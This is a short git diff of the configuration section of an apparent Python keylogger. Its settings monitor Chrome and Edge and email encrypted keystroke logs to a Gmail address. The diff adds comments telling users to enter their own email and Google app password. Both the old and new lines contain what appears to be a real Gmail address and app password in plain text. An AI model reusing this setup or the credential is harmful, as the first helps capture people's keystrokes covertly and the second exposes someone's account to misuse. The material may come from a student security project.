@@ -16,10 +16,10 @@ import time
 keys_information = "key_logs.encrypted"
 decrypted_information = "key_logs.txt"
 encryption_key_file = "encryption.key"
-email_address = "harshithsamudrala@gmail.com"
-password = "vvvm ejpl rhib wkaa"
-to_email_address = "harshithsamudrala@gmail.com"
-file_path = "D:\\Cyber\\Infotact Internship\\Projret1\\.venv"
+email_address = "harshithsamudrala@gmail.com"#enter your email
+password = "vvvm ejpl rhib wkaa"#add google app password
+to_email_address = "harshithsamudrala@gmail.com"#enter email to which to send the information
+file_path = "D:\\Cyber\\Internship\\Project\\.venv"
 extend = "\\"
 apps_list = ['chrome', 'edge']  # Add the applications you want to monitor
 
@@ -214,3 +214,4 @@ if __name__ == "__main__":
         sys.exit(0)
     except Exception as e:
         print(f"An error occurred: {e}")
+
